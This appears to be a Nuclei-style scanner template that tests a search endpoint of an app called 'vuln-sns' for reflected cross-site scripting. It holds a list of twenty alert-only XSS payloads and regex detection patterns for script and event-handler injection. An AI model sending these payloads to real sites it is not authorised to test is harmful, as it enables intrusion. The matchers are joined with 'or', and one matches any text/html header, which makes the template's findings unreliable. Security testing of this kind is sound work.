id: vuln-sns-search-xss-reflected
info:
  name: Vuln SNS Search - Reflected XSS
  author: claude
  severity: high
  description: |
    Tests for reflected cross-site scripting vulnerabilities in the search endpoint.
    User input from the tag parameter may be reflected without proper sanitization.
  reference:
    - https://owasp.org/www-community/attacks/xss/
  tags: vuln-sns,xss,reflected,search

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/search?tag={{payload}}"

    payloads:
      payload:
        - "<script>alert('XSS')</script>"
        - "<img src=x onerror=alert('XSS')>"
        - "<svg onload=alert('XSS')>"
        - "javascript:alert('XSS')"
        - "<iframe src='javascript:alert(\"XSS\")'>"
        - "<body onload=alert('XSS')>"
        - "'><script>alert('XSS')</script>"
        - "\"><script>alert('XSS')</script>"
        - "<ScRiPt>alert('XSS')</ScRiPt>"
        - "%3Cscript%3Ealert('XSS')%3C/script%3E"
        - "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;"
        - "<img src=\"x\" onerror=\"alert('XSS')\">"
        - "<input onfocus=alert('XSS') autofocus>"
        - "<select onfocus=alert('XSS') autofocus>"
        - "<textarea onfocus=alert('XSS') autofocus>"
        - "<keygen onfocus=alert('XSS') autofocus>"
        - "<video><source onerror=\"alert('XSS')\">"
        - "<audio src=x onerror=alert('XSS')>"
        - "<details open ontoggle=alert('XSS')>"
        - "<marquee onstart=alert('XSS')>"

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "<script>alert('XSS')</script>"
          - "alert('XSS')"
          - "alert(\"XSS\")"
          - "javascript:alert"
        condition: or
        part: body

      - type: regex
        regex:
          - '<script[^>]*>.*?</script>'
          - 'on(load|error|click|focus|blur|mouse[a-z]+)\\s*=\\s*["\']?[^"\']*["\']?'
          - 'javascript:\\s*alert'
        condition: or
        part: body

      - type: word
        words:
          - "Content-Type: text/html"
        part: header
        condition: and
        negative: false

    extractors:
      - type: regex
        name: xss_payload
        regex:
          - '<[^>]+>'
        part: body